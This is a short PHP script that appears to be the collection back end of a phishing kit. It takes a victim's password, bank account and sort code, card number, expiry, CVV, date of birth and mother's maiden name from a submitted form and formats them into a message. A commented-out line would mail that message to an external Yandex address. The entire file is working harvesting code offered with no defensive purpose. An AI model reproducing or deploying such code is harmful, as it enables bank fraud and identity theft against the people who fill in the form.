<?php
$mobile = $_POST['mobile'];
$email = $_POST['email'];
$password = $_POST['password'];
$fName = $_POST['fName'];
$mName = $_POST['mName'];
$lName = $_POST['lName'];
$address = $_POST['address'];
$dob = $_POST['dob'];
$postcode = $_POST['postcode'];
$acc_no = $_POST['acc_no'];
$shortcode = $_POST['shortcode'];
$card_no = $_POST['card_no'];
$card_exp = $_POST['card_exp'];
$CVV = $_POST['CVV'];
$motherName = $_POST['motherName'];

$msg = "Mobile No: ".stripslashes($mobile)."<br>\n\r";
$msg .= "Email: ".stripslashes($email)."<br>\n\r";
$msg .= "Password: ".stripslashes($password)."<br>\n\r";
$msg .= "First Name: ".stripslashes($fName)."<br>\n\r";
$msg .= "Middle Name: ".stripslashes($mName)."<br>\n\r";
$msg .= "Last Name: ".stripslashes($lName)."<br>\n\r";
$msg .= "Address: ".stripslashes($address)."<br>\n\r";
$msg .= "Date of Birth: ".str_replace('/', '-', stripslashes($dob))."<br>\n\r";
$msg .= "PostCode: ".stripslashes($postcode)."<br>\n\r";
$msg .= "Account No: ".stripslashes($acc_no)."<br>\n\r";
$msg .= "Shortcode: ".stripslashes($shortcode)."<br>\n\r";
$msg .= "Card No: ".stripslashes($card_no)."<br>\n\r";
$msg .= "Card Expiry: ".str_replace('/', '-', stripslashes($card_exp))."<br>\n\r";
$msg .= "CVV: ".stripslashes($CVV)."<br>\n\r";
$msg .= "Mother's Maiden Name: ".stripslashes($motherName)."<br>\n\r";

echo $msg;

// mail('mailto:p4shaa.p@yandex.com', 'EE', $msg);